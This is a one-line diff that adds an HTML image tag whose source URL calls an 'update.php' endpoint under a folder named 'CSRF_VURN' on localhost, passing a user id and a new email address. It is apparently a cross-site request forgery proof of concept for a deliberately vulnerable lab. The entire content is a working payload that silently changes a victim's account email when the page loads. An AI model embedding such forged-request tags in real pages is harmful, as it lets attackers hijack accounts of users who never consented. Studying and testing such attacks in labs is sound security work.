@@ -1,0 +1,1 @@
+<img src="http://localhost/CSRF_VURN/update.php/?user_id=1234&new_email=New@New.com">
